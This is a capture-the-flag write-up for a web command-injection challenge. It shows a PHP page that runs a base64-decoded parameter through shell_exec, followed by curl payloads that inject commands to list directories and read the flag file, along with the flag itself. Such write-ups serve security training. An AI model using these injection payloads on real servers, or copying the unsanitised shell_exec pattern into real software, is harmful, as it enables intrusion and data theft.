# Command Injection 1
Web

## Challenge 

Pretty much another command injection challenge. Google about command injection?

http://challs.hats.sg:1337/

Flag format: flag{.+}

Challenge by: Gladiator

## Hint

## Solution

http://challs.hats.sg:1337/

	ONLY BASE 64! COMMANDO
	GET me a 'cmd'
	You can also GET 'SRC' if you want to..

http://challs.hats.sg:1337/?SRC

	<!DOCTYPE html>
	<html>
	<?php 
	    if(isset($_GET['SRC'])){
	        show_source("index.php");
	        die();
	    }
	    $cmd = base64_decode($_GET['cmd']);
	    if(!$cmd){
	        echo "ONLY BASE 64!";
	    }
	    else{
	        $output = shell_exec("echo ". $cmd);
	        echo "<pre>$output</pre>";    
	    }

	?>
	<head>
	    <title></title>
	</head>
	<body>
	    COMMANDO<br>
	    GET me a 'cmd'<br>
	    You can also GET 'SRC' if you want to..
	</body>
	</html>

Do some payloads

	$ curl -s http://challs.hats.sg:1337/?cmd=$(echo 'HELLO WORLD' | base64) | html2text
	HELLO WORLD

	$ curl -s http://challs.hats.sg:1337/?cmd=$(echo '; ls -la' | base64) | html2text
	total 12
	drwxrwxr-x 1 root root 4096 Sep  6 18:42 .
	drwxrwxr-x 1 root root 4096 Mar 27 01:00 ..
	-rwxrwxr-x 1 root root  388 Sep  6 17:31 index.php

	$ curl -s http://challs.hats.sg:1337/?cmd=$(echo '; pwd' | base64) | html2text
	/var/www/html

	$ curl -s http://challs.hats.sg:1337/?cmd=$(echo '; ls ../../../flag' | base64) | html2text
	flag.txt

	$ curl -s http://challs.hats.sg:1337/?cmd=$(echo '; cat ../../../flag/flag.txt' | base64) | html2text
	flag{there_was_one_night_there_was_no_light}

## Flag

	flag{there_was_one_night_there_was_no_light}
